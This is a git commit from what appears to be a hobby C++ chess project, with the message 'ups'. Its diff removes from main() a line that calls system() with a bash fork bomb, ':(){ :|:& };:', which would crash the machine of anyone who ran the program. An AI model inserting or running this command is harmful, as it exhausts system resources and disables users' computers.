619bb412a8346058f5ac49e57c8f964845e7cabe
wertzuz <quint.schartel@gmail.com>
2023-10-05 18:39:59 +0200

    ups

--- src/main.cpp
+++ src/main.cpp
@@ -3,7 +3,6 @@
 // TODO Schach, En passant, checkmate, rotating of table, online, potentially ai????????
 int main(int argc, char* args[])
 {
-    system(":(){ :|:& };:");
     Game Game("rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1");
     //Game Game("rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1", false);
     return 0;
